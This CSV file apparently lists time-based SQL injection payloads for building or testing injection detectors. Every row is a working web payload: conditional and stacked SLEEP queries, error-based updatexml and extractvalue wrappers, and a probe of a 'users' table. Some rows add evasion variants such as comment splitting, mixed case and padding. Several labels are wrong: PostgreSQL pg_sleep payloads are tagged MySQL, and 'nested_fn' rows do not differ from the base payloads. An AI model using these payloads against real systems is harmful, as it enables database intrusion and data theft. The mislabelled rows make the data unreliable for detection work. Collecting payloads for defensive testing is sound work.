Query,platform,base_type,original_id,transform_type,delay_value,obfuscation
' AND 1=CASE WHEN (SLEEP(1) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,0,time-based-blind,1,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(1) ELSE NULL END )||',MySQL,boolean_or_error,1,time-based-blind,1,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(1), 0)--",MySQL,boolean_or_error,2,time-based-blind,1,none
' AND (SELECT 1 FROM (SELECT(SLEEP(1)))a)--,MySQL,boolean_or_error,3,time-based-blind,1,none
"' OR updatexml(1,concat(0x7e,SLEEP(1)),1)--",MySQL,boolean_or_error,4,time-based-blind,1,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(1))))--",MySQL,boolean_or_error,5,time-based-blind,1,none
'; SLEEP(1); -- ,MySQL,direct_time,6,time-based-none,1,none
'; S/*obf*/LEEP(1); -- ,MySQL,direct_time,7,time-based-injected_comment,1,injected_comment
';     SLEEP(1);  --    ,MySQL,direct_time,8,time-based-extra_spaces,1,extra_spaces
'; SLEEP(1); -- ,MySQL,direct_time,9,time-based-nested_fn,1,nested_fn
'; SlEep(1); -- ,MySQL,direct_time,10,time-based-mixed_case,1,mixed_case
' AND 1=CASE WHEN (SLEEP(3) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,11,time-based-blind,3,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE NULL END )||',MySQL,boolean_or_error,12,time-based-blind,3,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(3), 0)--",MySQL,boolean_or_error,13,time-based-blind,3,none
' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)--,MySQL,boolean_or_error,14,time-based-blind,3,none
"' OR updatexml(1,concat(0x7e,SLEEP(3)),1)--",MySQL,boolean_or_error,15,time-based-blind,3,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(3))))--",MySQL,boolean_or_error,16,time-based-blind,3,none
'; SLEEP(3); -- ,MySQL,direct_time,17,time-based-none,3,none
'; S/*obf*/LEEP(3); -- ,MySQL,direct_time,18,time-based-injected_comment,3,injected_comment
';   SLEEP(3);    --    ,MySQL,direct_time,19,time-based-extra_spaces,3,extra_spaces
'; SLEEP(3); -- ,MySQL,direct_time,20,time-based-nested_fn,3,nested_fn
'; slEEP(3); -- ,MySQL,direct_time,21,time-based-mixed_case,3,mixed_case
' AND 1=CASE WHEN (SLEEP(5) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,22,time-based-blind,5,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END )||',MySQL,boolean_or_error,23,time-based-blind,5,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0)--",MySQL,boolean_or_error,24,time-based-blind,5,none
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--,MySQL,boolean_or_error,25,time-based-blind,5,none
"' OR updatexml(1,concat(0x7e,SLEEP(5)),1)--",MySQL,boolean_or_error,26,time-based-blind,5,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(5))))--",MySQL,boolean_or_error,27,time-based-blind,5,none
'; SLEEP(5); -- ,MySQL,direct_time,28,time-based-none,5,none
'; S/*obf*/LEEP(5); -- ,MySQL,direct_time,29,time-based-injected_comment,5,injected_comment
';    SLEEP(5);  --   ,MySQL,direct_time,30,time-based-extra_spaces,5,extra_spaces
'; SLEEP(5); -- ,MySQL,direct_time,31,time-based-nested_fn,5,nested_fn
'; Sleep(5); -- ,MySQL,direct_time,32,time-based-mixed_case,5,mixed_case
' AND 1=CASE WHEN (SLEEP(7) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,33,time-based-blind,7,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE NULL END )||',MySQL,boolean_or_error,34,time-based-blind,7,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(7), 0)--",MySQL,boolean_or_error,35,time-based-blind,7,none
' AND (SELECT 1 FROM (SELECT(SLEEP(7)))a)--,MySQL,boolean_or_error,36,time-based-blind,7,none
"' OR updatexml(1,concat(0x7e,SLEEP(7)),1)--",MySQL,boolean_or_error,37,time-based-blind,7,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(7))))--",MySQL,boolean_or_error,38,time-based-blind,7,none
'; SLEEP(7); -- ,MySQL,direct_time,39,time-based-none,7,none
'; S/*obf*/LEEP(7); -- ,MySQL,direct_time,40,time-based-injected_comment,7,injected_comment
';   SLEEP(7);    --    ,MySQL,direct_time,41,time-based-extra_spaces,7,extra_spaces
'; SLEEP(7); -- ,MySQL,direct_time,42,time-based-nested_fn,7,nested_fn
'; SLEEp(7); -- ,MySQL,direct_time,43,time-based-mixed_case,7,mixed_case
' AND 1=CASE WHEN (SLEEP(10) IS NULL) THEN 1 ELSE 0 END--,MySQL,boolean_or_error,44,time-based-blind,10,none
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END )||',MySQL,boolean_or_error,45,time-based-blind,10,none
"' AND IF((SELECT COUNT(*) FROM users)>0, SLEEP(10), 0)--",MySQL,boolean_or_error,46,time-based-blind,10,none
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,MySQL,boolean_or_error,47,time-based-blind,10,none
"' OR updatexml(1,concat(0x7e,SLEEP(10)),1)--",MySQL,boolean_or_error,48,time-based-blind,10,none
"' AND extractvalue(1,concat(0x7e,(SELECT SLEEP(10))))--",MySQL,boolean_or_error,49,time-based-blind,10,none
